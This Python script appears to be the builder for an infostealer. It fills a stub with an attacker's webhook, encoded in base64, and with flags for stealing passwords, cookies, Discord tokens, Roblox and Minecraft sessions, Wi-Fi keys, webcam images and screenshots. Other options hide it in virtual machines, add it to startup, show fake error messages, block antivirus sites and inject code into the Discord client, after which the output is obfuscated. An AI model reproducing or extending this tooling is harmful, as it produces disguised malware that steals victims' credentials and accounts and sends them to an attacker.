import json
import base64
import os

import BlankOBF as obfuscator

SettingsFile = "config.json"
InjectionFile = "injection-obfuscated.js"
InCodeFile = "stub.py"
OutCodeFile = "stub-o.py"

def WriteSettings(code: str, settings: dict, injection: str) -> str:
    code = code.replace('"%webhook%"', EncryptString(settings["settings"]["webhook"]))
    code = code.replace('%pingme%', "true" if settings["settings"]["pingme"] else "")
    code = code.replace('%vmprotect%', "true" if settings["settings"]["vmprotect"] else "")
    code = code.replace('%startup%', "true" if settings["settings"]["startup"] else "")
    code = code.replace('%melt%', "true" if settings["settings"]["melt"] else "")
    
    code = code.replace('%capturewebcam%', "true" if settings["modules"]["captureWebcam"] else "")
    code = code.replace('%capturepasswords%', "true" if settings["modules"]["capturePasswords"] else "")
    code = code.replace('%capturecookies%', "true" if settings["modules"]["captureCookies"] else "")
    code = code.replace('%capturehistory%', "true" if settings["modules"]["captureHistory"] else "")
    code = code.replace('%capturediscordtokens%', "true" if settings["modules"]["captureDiscordTokens"] else "")
    code = code.replace('%captureminecraft%', "true" if settings["modules"]["captureMinecraftSessionFiles"] else "")
    code = code.replace('%captureroblox%', "true" if settings["modules"]["captureRobloxCookies"] else "")
    code = code.replace('%capturewifipasswords%', "true" if settings["modules"]["captureWifiPasswords"] else "")
    code = code.replace('%capturesysteminfo%', "true" if settings["modules"]["captureSystemInfo"] else "")
    code = code.replace('%capturescreenshot%', "true" if settings["modules"]["captureScreenshot"] else "")

    code = code.replace('%fakeerror%', "true" if settings["modules"]["fakeError"][0] else "")
    code = code.replace("%title%", settings["modules"]["fakeError"][1][0])
    code = code.replace("%message%", settings["modules"]["fakeError"][1][1])
    code = code.replace("%icon%", str(settings["modules"]["fakeError"][1][2]))

    code = code.replace('%blockavsites%', "true" if settings["modules"]["blockAvSites"] else "")
    code = code.replace('%discordinjection%', "true" if settings["modules"]["discordInjection"] else "")

    code = code.replace("%injectionbase64encoded%", base64.b64encode(injection.encode()).decode())
    
    return code

def ReadSettings() -> tuple[dict, str]:

    settings, injection = dict(), str()
    if os.path.isfile(SettingsFile):
        with open(SettingsFile) as file:
            settings = json.load(file)

    if os.path.isfile(InjectionFile):
        with open(InjectionFile, encoding= "utf-8", errors= "ignore") as file:
            injection = file.read()
    
    return (settings, injection)

def EncryptString(plainText: str) -> str:
    encoded = base64.b64encode(plainText.encode()).decode()
    return "base64.b64decode(\"{}\").decode()".format(encoded)

def main() -> None:
    with open(InCodeFile) as file:
        code = file.read()

    code = WriteSettings(code, *ReadSettings())

    obfuscator.BlankOBF(code, OutCodeFile)

if __name__ == "__main__":
    main()